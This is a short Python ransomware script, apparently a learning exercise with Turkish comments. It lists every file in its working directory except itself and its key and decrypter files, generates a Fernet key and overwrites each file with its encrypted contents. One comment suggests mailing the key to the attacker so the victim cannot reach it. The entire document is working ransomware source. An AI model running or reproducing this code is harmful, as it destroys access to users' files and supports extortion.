import os
from cryptography.fernet import Fernet #fernet şifreleme algoritması


file_list=[]
for i in os.listdir():               #bu fonksiyon kodun bulunduğu klasördeki tüm dosyaları gösteriyor.
    if i == "ransom.py" or i == "generatedkey.key" or i == "ransomdecrypter.py":   #kodu ve şifrenin yazılı olduğu doyayı şifrelemememiz lazım
        continue
    if os.path.isfile(i):      #içine yazılan şeyin dosya mı falan olduğuna bakıyor dosya ise şart sağlanıyor klasörleri şifrelemicez
        file_list.append(i)

print(file_list)

key = Fernet.generate_key()

print(key)
#üsteki ve alttaki satır normal da olmaz çünkü şifre oralarda yazıyor bunları gmail ile şifreyi kendimize gönderebiliriz target erişmesin diye
with open("generatedkey.key","wb") as generatedkey:
    generatedkey.write(key)

#keyin yazılı olduğu bir doya yazdık yukarıda

#biz bu kodda dosyaların içinde yazan yazıları şifreliyoruz yani dosyayı açabiliyor ama içinde yazandan hiçbir şey anlaşılmıyor
#şifreli bir şekilde dosyanın içinde yazılanları tekrar yazdık dosyaya password koymadık


for t in file_list:
    with open(t,"rb") as file:  #dosyayı açtık okuduk
        contents = file.read()
    contents_encrypted = Fernet(key).encrypt(contents)  #şifreleme : fernet ile anahtarı istiyor, neyi şifreleyeceğini soruyor
    #hangi anahtara göre şifreleyeceğini soruyor
    with open(t,"wb") as file:   #dosyayı tekrar açtık
        file.write(contents_encrypted)  #ve içine şifrelenmiş halini yazdık
